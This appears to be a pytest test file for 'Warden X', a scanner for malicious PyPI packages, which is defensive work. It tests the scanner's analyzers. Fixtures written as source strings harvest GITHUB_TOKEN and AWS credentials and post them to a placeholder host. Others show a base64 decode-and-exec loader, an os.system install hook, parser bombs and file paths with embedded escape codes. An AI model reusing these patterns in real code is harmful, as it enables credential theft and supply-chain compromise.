"""Analyzer contract tests: the six v1 analyzers on the Warden X ``Finding`` contract.

For each migrated analyzer these tests pin registry membership and selection, name and
version, confidence and provenance per the SPEC guidance, the unchanged v1 weights and
severities, and — most importantly — that source locations are real parser positions:
never invented, bounded, ordered by package file order then line, and safe when relpaths
are hostile.

Inputs are in-memory source strings; nothing is ever executed. IOC values are read from the
bundled synthetic demonstration snapshot (``data/iocs.json``), not live threat intelligence.
"""

from __future__ import annotations

import base64
import json

import pytest

from app.analysis import analyzers as registry
from app.analysis.analyzers.base import BaseAnalyzer, PackageContext, SourceFile
from app.analysis.analyzers.install_script import InstallScriptAnalyzer
from app.analysis.analyzers.ioc import IOCAnalyzer, _iocs
from app.analysis.analyzers.metadata import MetadataAnalyzer
from app.analysis.analyzers.obfuscation import ObfuscationAnalyzer, shannon_entropy
from app.analysis.analyzers.static_code import MAX_EVIDENCE_LOCATIONS, LocationCollector, StaticCodeAnalyzer
from app.analysis.analyzers.typosquat import TyposquatAnalyzer
from app.analysis.findings import Finding, Location, Provenance, Severity
from app.analysis.signals import Capability, Code
from app.core.config import settings

V1_ANALYZER_NAMES = ["metadata", "typosquat", "static_code", "install_script", "obfuscation", "ioc"]
# High-entropy, base64-alphabet blobs (>= 120 chars, entropy well above the 4.3 bits/char threshold).
BLOB_A = base64.b64encode(bytes(range(256))).decode()
BLOB_B = base64.b64encode(bytes((i * 37 + 11) % 256 for i in range(256))).decode()
# Sources the CPython 3.12 parser rejects with MemoryError / RecursionError instead of SyntaxError.
PARSER_STACK_BOMB = "-" * 200_000 + "1\n"
AST_RECURSION_BOMB = "a" + ".b" * 200_000 + "\n"


def make_ctx(files: dict[str, str] | None = None, *, name: str = "demo-internal-tool",
             metadata: dict | None = None) -> PackageContext:
    return PackageContext(
        ecosystem="pypi", name=name, version="1.0.0",
        files=[SourceFile(relpath=k, text=v, size=len(v)) for k, v in (files or {}).items()],
        metadata=metadata or {},
    )


def line_of(text: str, needle: str, occurrence: int = 1) -> int:
    """1-based line of the n-th line containing ``needle``, computed independently of the analyzers."""
    hits = [i for i, line in enumerate(text.splitlines(), start=1) if needle in line]
    return hits[occurrence - 1]


def only(findings: list[Finding], code: str) -> Finding:
    matches = [f for f in findings if f.code == code]
    assert len(matches) == 1, [f.code for f in findings]
    return matches[0]


def loc(file: str, line: int | None) -> dict:
    return {"file": file, "line": line}


# --------------------------------------------------------------------------- registry
def test_registry_holds_the_six_v1_analyzers_as_base_analyzers():
    assert [a.name for a in registry.ALL_ANALYZERS][:6] == V1_ANALYZER_NAMES
    for analyzer in registry.ALL_ANALYZERS[:6]:
        assert isinstance(analyzer, BaseAnalyzer)
        assert isinstance(analyzer, registry.Analyzer)
        assert analyzer.version == "1.1.0"
        assert analyzer.requires_network is False
        status = analyzer.availability()
        assert status.available is True and status.name == analyzer.name


def test_get_analyzers_defaults_to_every_registered_analyzer(monkeypatch):
    monkeypatch.setattr(settings, "ENABLED_ANALYZERS", [])
    monkeypatch.setattr(settings, "DISABLED_ANALYZERS", [])
    assert registry.get_analyzers() == registry.ALL_ANALYZERS
    assert registry.get_analyzers() is not registry.ALL_ANALYZERS  # callers cannot mutate the registry


def test_get_analyzers_honours_settings_and_keeps_registry_order(monkeypatch):
    monkeypatch.setattr(settings, "ENABLED_ANALYZERS", ["ioc", " Static-Code ", "metadata"])
    monkeypatch.setattr(settings, "DISABLED_ANALYZERS", ["METADATA"])
    assert [a.name for a in registry.get_analyzers()] == ["static_code", "ioc"]


def test_get_analyzers_explicit_arguments_override_settings(monkeypatch):
    monkeypatch.setattr(settings, "DISABLED_ANALYZERS", ["typosquat"])
    assert "typosquat" not in [a.name for a in registry.get_analyzers()]
    assert "typosquat" in [a.name for a in registry.get_analyzers(enabled=[], disabled=[])]
    assert [a.name for a in registry.get_analyzers(enabled=["typosquat"], disabled=[])] == ["typosquat"]


def test_unknown_enabled_analyzer_name_is_logged_not_silently_ignored(monkeypatch):
    events: list[tuple[str, dict]] = []

    class _Log:
        def warning(self, event, **kw):
            events.append((event, kw))

    monkeypatch.setattr(registry, "log", _Log())
    assert registry.get_analyzers(enabled=["statc_code"], disabled=[]) == []
    assert events == [("unknown_enabled_analyzers", {"names": ["statc_code"]})]


def test_register_analyzer_validates_and_rejects_duplicates(monkeypatch):
    monkeypatch.setattr(registry, "ALL_ANALYZERS", list(registry.ALL_ANALYZERS))

    class Shadow(BaseAnalyzer):
        name = "Static-Code"  # same analyzer as static_code once normalised

        def analyze(self, ctx):
            return []

    with pytest.raises(ValueError):
        registry.register_analyzer(Shadow())
    index = [a.name for a in registry.ALL_ANALYZERS].index("static_code")
    replacement = registry.register_analyzer(Shadow(), replace=True)
    assert registry.ALL_ANALYZERS[index] is replacement

    class Nameless:
        name = "   "

        def analyze(self, ctx):
            return []

    class NoAnalyze:
        name = "no_analyze"

    for bad in (Nameless(), NoAnalyze()):
        with pytest.raises(ValueError):
            registry.register_analyzer(bad)


# --------------------------------------------------------------------------- LocationCollector
def test_location_collector_accepts_only_real_positions_and_bounds_memory():
    c = LocationCollector(limit=3)
    for bad in (0, -1, True, 2.0, "3"):
        c.add("k", 0, "a.py", bad)
    assert c.first("k") is None and c.evidence("k") == []

    c.add("k", 1, "b.py", 7)
    c.add("k", 0, "a.py", 9)
    c.add("k", 0, "a.py", None)  # file known, line unknown
    c.add("k", 0, "a.py", 9)  # duplicate
    assert c.evidence("k") == [loc("a.py", None), loc("a.py", 9), loc("b.py", 7)]
    c.add("k", 2, "c.py", 1)  # later than everything kept while full: dropped
    assert c.evidence("k") == [loc("a.py", None), loc("a.py", 9), loc("b.py", 7)]
    c.add("k", 0, "a.py", 1)  # earlier: evicts the latest entry
    assert c.evidence("k") == [loc("a.py", None), loc("a.py", 1), loc("a.py", 9)]
    assert c.first("k") == Location(file="a.py", line=None)


# --------------------------------------------------------------------------- static_code
# Analyzer inputs in this module are *source text* that the analyzers parse with ``ast``. The
# eval/exec/os.system calls inside these strings are never executed by the tests or by Warden.
STATIC_SRC = (
    "import os\n"
    "import subprocess\n"
    "import requests\n"
    "\n"
    "def run():\n"
    "    subprocess.Popen(['id'])\n"
    "    token = os.environ['GITHUB_TOKEN']\n"
    "    open('/home/u/.aws/credentials').read()\n"
    "    requests.post('https://example.invalid', data=token)\n"
    "    eval('1 + 1')\n"
)


def test_static_code_confidence_weights_and_first_occurrence_lines():
    f = "pkg/mod.py"
    findings = StaticCodeAnalyzer().analyze(make_ctx({f: STATIC_SRC}))
    expected = {
        # code: (severity, weight, confidence, needle of first occurrence, capability)
        Code.NETWORK_EGRESS: (Severity.low, 1.5, 0.5, "import requests", Capability.NETWORK),
        Code.SUBPROCESS_EXEC: (Severity.medium, 3.0, 0.55, "subprocess.Popen", Capability.SUBPROCESS),
        Code.DYNAMIC_EXEC: (Severity.medium, 4.0, 0.6, "eval(", Capability.DYNAMIC_EXEC),
        Code.ENV_HARVEST: (Severity.critical, 9.0, 0.65, "GITHUB_TOKEN", Capability.ENV_HARVEST),
        Code.FS_SENSITIVE: (Severity.high, 5.0, 0.7, ".aws/credentials", None),
        Code.DANGEROUS_IMPORT: (Severity.low, 0.8, 0.4, "import subprocess", None),
    }
    assert sorted(x.code for x in findings) == sorted(expected)
    for code, (severity, weight, confidence, needle, capability) in expected.items():
        finding = only(findings, code)
        assert (finding.severity, finding.weight, finding.confidence) == (severity, weight, confidence), code
        assert finding.capability == capability
        assert finding.provenance == Provenance.STATIC
        assert finding.location == Location(file=f, line=line_of(STATIC_SRC, needle)), code
        assert finding.evidence["locations"][0] == loc(f, line_of(STATIC_SRC, needle))

    network = only(findings, Code.NETWORK_EGRESS)
    assert network.evidence["locations"] == [loc(f, 3), loc(f, line_of(STATIC_SRC, "requests.post"))]


def test_static_code_first_occurrence_is_source_order_not_visit_order():
    # NodeVisitor visits a function body before its decorators; the reported first
    # occurrence must still be the decorator on line 1.
    src = "@register(eval('x'))\ndef f():\n    eval('y')\n"
    finding = only(StaticCodeAnalyzer().analyze(make_ctx({"m.py": src})), Code.DYNAMIC_EXEC)
    assert finding.location.line == 1
    assert finding.evidence["locations"] == [loc("m.py", 1), loc("m.py", 3)]


def test_static_code_locations_follow_package_file_order_and_are_capped():
    files = {f"pkg/m{i:02d}.py": "x = 1\n" * i + "eval('1')\n" for i in range(30)}
    finding = only(StaticCodeAnalyzer().analyze(make_ctx(files)), Code.DYNAMIC_EXEC)
    assert finding.location == Location(file="pkg/m00.py", line=1)
    assert len(finding.evidence["locations"]) == MAX_EVIDENCE_LOCATIONS == 10
    assert finding.evidence["locations"] == [loc(f"pkg/m{i:02d}.py", i + 1) for i in range(10)]
    assert "30 time(s)" in finding.message  # counting is unchanged by the location cap


def test_static_code_lines_are_real_for_every_finding():
    src = "\n".join(["# padding"] * 40 + [STATIC_SRC])
    for finding in StaticCodeAnalyzer().analyze(make_ctx({"a.py": src, "b.py": STATIC_SRC})):
        lines = {"a.py": src.splitlines(), "b.py": STATIC_SRC.splitlines()}
        for position in finding.evidence["locations"]:
            text = lines[position["file"]]
            assert 1 <= position["line"] <= len(text)
            assert text[position["line"] - 1].strip() and not text[position["line"] - 1].startswith("#")


def test_static_code_unparseable_uses_parser_line_or_none():
    broken = "x = 1\ny = 2\ndef (:\n    pass\n"
    finding = only(StaticCodeAnalyzer().analyze(make_ctx({"pkg/broken.py": broken})), Code.UNPARSEABLE)
    assert (finding.severity, finding.weight, finding.confidence) == (Severity.medium, 3.0, 0.6)
    assert finding.location == Location(file="pkg/broken.py", line=3)

    bomb = only(StaticCodeAnalyzer().analyze(make_ctx({"bomb.py": PARSER_STACK_BOMB})), Code.UNPARSEABLE)
    assert bomb.location == Location(file="bomb.py", line=None)  # no line invented
    assert bomb.evidence["locations"] == [loc("bomb.py", None)]


@pytest.mark.parametrize("bomb", [PARSER_STACK_BOMB, AST_RECURSION_BOMB], ids=["memory-error", "recursion-error"])
def test_parser_bomb_in_one_file_cannot_hide_findings_in_others(bomb):
    harvest = "import os\nkey = os.getenv('AWS_SECRET_ACCESS_KEY')\n"
    findings = StaticCodeAnalyzer().analyze(make_ctx({"aaa_bomb.py": bomb, "pkg/steal.py": harvest}))
    finding = only(findings, Code.ENV_HARVEST)
    assert finding.location == Location(file="pkg/steal.py", line=2)
    assert Code.UNPARSEABLE not in {f.code for f in findings}  # v1: only when nothing parsed


def test_hostile_relpaths_are_escaped_in_locations():
    hostile = "pkg/\x1b[2Jevil‮txt.py"
    finding = only(StaticCodeAnalyzer().analyze(make_ctx({hostile: "eval('x')\n"})), Code.DYNAMIC_EXEC)
    rendered = json.dumps(finding.to_dict())
    for raw in ("\x1b", "‮"):
        assert raw not in finding.location.file
        assert raw not in finding.evidence["locations"][0]["file"]
        assert raw not in json.loads(rendered)["location"]["file"]
    assert finding.location.line == 1


# --------------------------------------------------------------------------- install_script
def test_install_script_active_behaviour_location_and_confidence():
    setup = (
        "from setuptools import setup\n"
        "import os\n"
        "\n"
        "import socket\n"
        "os.system('id')\n"
        "setup(name='x', cmdclass={})\n"
    )
    finding = only(InstallScriptAnalyzer().analyze(make_ctx({"setup.py": setup})), Code.INSTALL_HOOK_EXEC)
    assert (finding.severity, finding.weight, finding.confidence) == (Severity.critical, 12.0, 0.85)
    assert finding.capability == Capability.INSTALL_EXEC
    assert finding.location == Location(file="setup.py", line=line_of(setup, "import socket"))
    assert finding.evidence["locations"] == [loc("setup.py", 4), loc("setup.py", 5)]
    assert finding.evidence["capability_imports"] == ["os", "socket"]
    assert finding.evidence["calls"] == ["system"]


def test_install_script_cmdclass_only_is_weaker_and_points_at_the_keyword():
    setup = (
        "from setuptools import setup\n"
        "from mybuild import BuildExt\n"
        "setup(\n"
        "    name='x',\n"
        "    cmdclass={'build_ext': BuildExt},\n"
        ")\n"
    )
    finding = only(InstallScriptAnalyzer().analyze(make_ctx({"sub/setup.py": setup})), Code.INSTALL_HOOK_EXEC)
    assert (finding.severity, finding.weight, finding.confidence) == (Severity.high, 6.0, 0.6)
    assert finding.location == Location(file="sub/setup.py", line=5)


# Explicit ids: pytest would otherwise use the 200k-character bomb source as the test id and
# fail writing it to PYTEST_CURRENT_TEST (Windows caps environment variables at 32767 chars).
@pytest.mark.parametrize(("source", "line"), [
    ("from setuptools import setup\nsetup(name=\n", 2),
    (PARSER_STACK_BOMB, None),
    (AST_RECURSION_BOMB, None),
], ids=["syntax-error", "memory-error", "recursion-error"])
def test_install_script_unparseable_is_a_finding_never_a_crash(source, line):
    finding = only(InstallScriptAnalyzer().analyze(make_ctx({"setup.py": source})), Code.UNPARSEABLE)
    assert (finding.severity, finding.weight, finding.confidence) == (Severity.medium, 3.0, 0.6)
    assert finding.location == Location(file="setup.py", line=line)


# --------------------------------------------------------------------------- obfuscation
def test_blob_fixtures_are_high_entropy():
    assert len(BLOB_A) >= 120 and shannon_entropy(BLOB_A) > 5.0
    assert len(BLOB_B) >= 120 and shannon_entropy(BLOB_B) > 5.0 and BLOB_A != BLOB_B


def test_encoded_exec_and_single_blob_obfuscation():
    src = (
        "import base64\n"
        "\n"
        f"PAYLOAD = '{BLOB_A}'\n"
        "data = base64.b64decode(PAYLOAD)\n"
        "exec(data)\n"
    )
    findings = ObfuscationAnalyzer().analyze(make_ctx({"pkg/loader.py": src}))
    encoded = only(findings, Code.ENCODED_EXEC)
    assert (encoded.severity, encoded.weight, encoded.confidence) == (Severity.critical, 10.0, 0.9)
    assert encoded.capability == Capability.OBFUSCATION
    assert encoded.location == Location(file="pkg/loader.py", line=3)
    assert encoded.evidence["locations"] == [loc("pkg/loader.py", 3), loc("pkg/loader.py", 4),
                                             loc("pkg/loader.py", 5)]
    blob = only(findings, Code.OBFUSCATION)
    assert (blob.severity, blob.weight, blob.confidence) == (Severity.medium, 4.5, 0.6)
    assert blob.location == Location(file="pkg/loader.py", line=3)
    assert blob.evidence["locations"] == [loc("pkg/loader.py", 3)]


def test_multiple_blobs_raise_obfuscation_confidence():
    files = {"a.py": f"X = '{BLOB_A}'\n", "b.py": f"\n\nY = '{BLOB_B}'\n"}
    blob = only(ObfuscationAnalyzer().analyze(make_ctx(files)), Code.OBFUSCATION)
    assert (blob.severity, blob.weight, blob.confidence) == (Severity.high, 6.0, 0.7)
    assert blob.evidence["locations"] == [loc("a.py", 1), loc("b.py", 3)]


def test_decode_and_exec_without_a_blob_is_not_encoded_exec():
    src = "import base64\nexec(base64.b64decode(load()))\n"
    assert ObfuscationAnalyzer().analyze(make_ctx({"m.py": src})) == []


def test_obfuscation_survives_parser_bombs():
    src = f"import base64\nexec(base64.b64decode('{BLOB_A}'))\n"
    findings = ObfuscationAnalyzer().analyze(make_ctx({"0.py": PARSER_STACK_BOMB, "1.py": AST_RECURSION_BOMB,
                                                       "2.py": src}))
    assert only(findings, Code.ENCODED_EXEC).location == Location(file="2.py", line=2)


# --------------------------------------------------------------------------- typosquat
@pytest.mark.parametrize(("name", "severity", "weight", "confidence", "distance"), [
    ("c0lorama", Severity.critical, 10.0, 0.9, 0),
    ("reqeusts", Severity.critical, 9.0, 0.8, 1),
    ("rquest", Severity.high, 6.0, 0.6, 2),
])
def test_typosquat_confidence_by_distance(name, severity, weight, confidence, distance):
    finding = only(TyposquatAnalyzer().analyze(make_ctx(name=name)), Code.TYPOSQUAT)
    assert (finding.severity, finding.weight, finding.confidence) == (severity, weight, confidence)
    assert finding.evidence["distance"] == distance
    assert finding.capability == Capability.TYPOSQUAT
    assert finding.location is None  # a name has no source position


# --------------------------------------------------------------------------- ioc
def test_ioc_exact_indicator_line_numbers_and_provenance():
    url = _iocs()["urls"][0]
    crlf = f"a = 1\r\nb = 2\r\n# {url}\r\n"
    old_mac = f"x = 1\ry = 2\r\rz = '{_iocs()['wallets'][0]}'\r"
    findings = IOCAnalyzer().analyze(make_ctx({"pkg/crlf.txt": crlf, "pkg/mac.py": old_mac}))
    finding = only(findings, Code.IOC_MATCH)
    assert (finding.severity, finding.weight, finding.confidence) == (Severity.critical, 12.0, 0.95)
    assert finding.provenance == "intel:bundled-ioc-snapshot" == Provenance.intel("bundled-ioc-snapshot")
    assert finding.capability == Capability.IOC
    assert finding.location == Location(file="pkg/crlf.txt", line=3)
    assert finding.evidence["locations"] == [loc("pkg/crlf.txt", 3), loc("pkg/mac.py", 4)]
    assert {m["type"] for m in finding.evidence["matches"]} == {"url", "wallet"}


def test_ioc_fingerprint_only_match_is_less_confident():
    fingerprint = _iocs()["fingerprints"][0]
    src = f"import os\nx = {fingerprint}('aGk=')\n"
    finding = only(IOCAnalyzer().analyze(make_ctx({"m.py": src})), Code.IOC_MATCH)
    assert finding.confidence == 0.8
    assert finding.location == Location(file="m.py", line=2)


def test_ioc_no_match_returns_nothing():
    assert IOCAnalyzer().analyze(make_ctx({"m.py": "print('hello')\n"})) == []


# --------------------------------------------------------------------------- metadata
def test_metadata_findings_are_registry_provenance_without_locations():
    md = {"_age_days": 2.5, "_maintainer_count": 1, "home_page": "", "project_urls": {},
          "_releases_last_7d": 12, "_version_found": False}
    findings = MetadataAnalyzer().analyze(make_ctx(metadata=md))
    expected = {
        Code.NEW_PACKAGE: (Severity.medium, 4.0, 0.4),
        Code.SINGLE_MAINTAINER: (Severity.low, 1.5, 0.3),
        Code.NO_SOURCE_REPO: (Severity.low, 2.0, 0.35),
        Code.RELEASE_FLOOD: (Severity.medium, 3.0, 0.5),
        Code.VERSION_NOT_FOUND: (Severity.low, 1.0, 1.0),
    }
    assert sorted(f.code for f in findings) == sorted(expected)
    for code, triple in expected.items():
        finding = only(findings, code)
        assert (finding.severity, finding.weight, finding.confidence) == triple, code
        assert finding.provenance == Provenance.REGISTRY
        assert finding.location is None

    older = MetadataAnalyzer().analyze(make_ctx(metadata={"_age_days": 20, "home_page": "https://example.org"}))
    assert [(f.code, f.severity, f.weight) for f in older] == [(Code.NEW_PACKAGE, Severity.low, 2.0)]


# --------------------------------------------------------------------------- serialisation
def _all_v1_findings() -> list[tuple[BaseAnalyzer, Finding]]:
    ctx = make_ctx(
        {
            "setup.py": "import socket\nsetup(name='x')\n",
            "pkg/mod.py": STATIC_SRC + f"exec(__import__('base64').b64decode('{BLOB_A}'))\n",
            "pkg/c2.txt": _iocs()["urls"][1] + "\n",
        },
        name="reqeusts",
        metadata={"_age_days": 1, "_maintainer_count": 1},
    )
    return [(a, f) for a in registry.ALL_ANALYZERS[:6] for f in a.analyze(ctx)]


def test_findings_are_stampable_and_round_trip_with_stable_ids():
    pairs = _all_v1_findings()
    assert {a.name for a, _ in pairs} == set(V1_ANALYZER_NAMES)  # every analyzer produced something
    for analyzer, finding in pairs:
        assert isinstance(finding, Finding)
        stamped = finding.with_defaults(analyzer=analyzer.name, analyzer_version=analyzer.version)
        data = json.loads(json.dumps(stamped.to_dict()))
        again = Finding.from_dict(data)
        assert again.finding_id == stamped.finding_id
        assert again.location == stamped.location
        assert data["analyzer"] == analyzer.name and data["analyzer_version"] == "1.1.0"
        assert data["confidence"] == finding.confidence and 0.0 < finding.confidence <= 1.0
        assert data["category"] and data["title"]
        locations = data["evidence"].get("locations")
        if locations is not None:
            assert len(locations) <= MAX_EVIDENCE_LOCATIONS
            if data["location"] is not None:
                assert locations[0] == {"file": data["location"]["file"], "line": data["location"]["line"]}
